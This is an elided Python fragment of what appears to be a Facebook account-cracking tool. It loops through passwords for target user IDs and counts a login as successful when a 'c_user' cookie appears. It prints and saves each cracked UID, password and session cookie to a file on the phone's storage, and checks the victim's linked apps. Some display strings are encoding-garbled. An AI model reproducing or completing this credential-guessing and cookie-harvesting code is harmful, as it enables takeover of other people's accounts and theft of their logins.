...
def cek_apk(session,coki):
    ...
    if len(game)==0:
        ...
        print(f'\r[HD] %s \x1b[1;95m â˜† Your Active Apps â˜†     :{WHITE}'%(GREEN))
    ...
    if len(game)==0:
        ...
        print(f'\r[HD] %s \x1b[1;95m â—‡ Your Expired Apps â—‡    :{WHITE}'%(M))
    ...
    try:
        ...
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                print('    \033[1;32m[HD-OK]  ' +uid+ ' | ' +ps+  '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')

                #cek_apk(session,coki)

                open('/sdcard/HD-OK.txt', 'a').write( uid+' | '+ps+'///'+coki+'\n' )
        ...
        sys.stdout.write(' %s[HD] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
